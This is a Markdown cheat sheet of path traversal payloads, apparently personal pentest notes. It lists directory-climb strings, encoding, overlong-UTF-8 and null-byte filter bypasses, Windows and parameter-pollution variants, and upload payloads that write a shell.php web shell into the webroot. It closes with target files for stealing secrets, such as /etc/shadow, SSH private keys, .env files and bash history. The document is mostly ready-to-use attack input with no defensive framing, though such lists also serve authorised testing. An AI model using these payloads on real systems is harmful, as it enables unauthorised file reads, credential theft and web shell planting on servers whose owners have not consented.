# 🔒 Comprehensive Path Traversal Payloads

Organized for Obsidian (headings, bullet lists, code blocks, tables where useful). Expanded with OS-specific, overlong/Unicode, and write-focused variants (e.g., for uploads).

## Basic Traversal Payloads

- **Relative Climbs**
  ```text
  ../../../../etc/passwd
  ../../../../../windows/system32/drivers/etc/hosts
  /../../../../../../etc/passwd  <!-- leading slash -->
  ```

- **Probes / Dots**
  ```text
  ../
  ../../
  ../../../..  <!-- vary levels -->
  /.  <!-- current dir test -->
  ```

## Bypass Technique Payloads

- **Absolute Path**
  ```text
  /etc/passwd
  C:\Windows\system32\drivers\etc\hosts  <!-- Windows -->
  \\server\share\file.txt  <!-- UNC paths -->
  ```

- **PIP (Payload in Payload / Non-Recursive)**
  ```text
  ....//....//etc/passwd
  ..././..././etc/passwd
  ..../.../../etc/passwd  <!-- variants -->
  ```

- **Encoding Variants**
  ```text
  ..%2f..%2fetc/passwd
  %2e%2e%2f
  %252e%252e%252f  <!-- double -->
  %c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd  <!-- UTF-8 overlong dot -->
  ```

- **Start-of-Path Validation**
  ```text
  /var/www/images/../../../../etc/passwd
  /static/../../../../etc/passwd
  /app/root/../../../../etc/passwd
  ```

- **Null Byte**
  ```text
  ../../../../etc/passwd%00.jpg
  ../../../../etc/passwd%00.png  <!-- extension truncate -->
  %00../../../../etc/passwd  <!-- prefix null -->
  ```

- **Overlong / Unicode (Expanded)**
  ```text
  ../../../../../../../../../../../../etc/passwd  <!-- overflow short filters -->
  %c0%af../../../../etc/passwd  <!-- UTF-8 slash equiv -->
  ..%c1%9c../../../../etc/passwd  <!-- invalid UTF-8 dot -->
  \u002e\u002e/\u002e\u002e/etc/passwd  <!-- Unicode dots -->
  ```

- **Windows-Specific**
  ```text
  ..\..\windows\win.ini
  C:/windows/system32/config/sam
  \\..\windows\system32\drivers\etc\hosts  <!-- UNC mixed -->
  ```

- **HPP (Pollution)**
  ```text
  file=../&file=../etc/passwd
  path=../../&path=../etc/passwd
  ```

## Write-Focused Payloads (If Writable)

- **Arbitrary Write (Uploads)**
  ```text
  ../../../../var/www/html/shell.php  <!-- write shell -->
  %00../../../../var/www/html/shell.php  <!-- with null -->
  ../uploads/../../shell.php  <!-- climb to webroot -->
  ```

## Post-Exploitation Targets

- **System Files**
  ```text
  /etc/passwd
  /etc/shadow
  /proc/self/environ
  ~/.ssh/id_rsa
  ```

- **App / Config Files**
  ```text
  /.env
  /var/www/config.php
  /app/web.xml
  /.git/HEAD  <!-- for repo dump -->
  ```

- **Logs / Creds**
  ```text
  /var/log/apache2/access.log
  /etc/mysql/my.cnf
  /root/.bash_history
  ```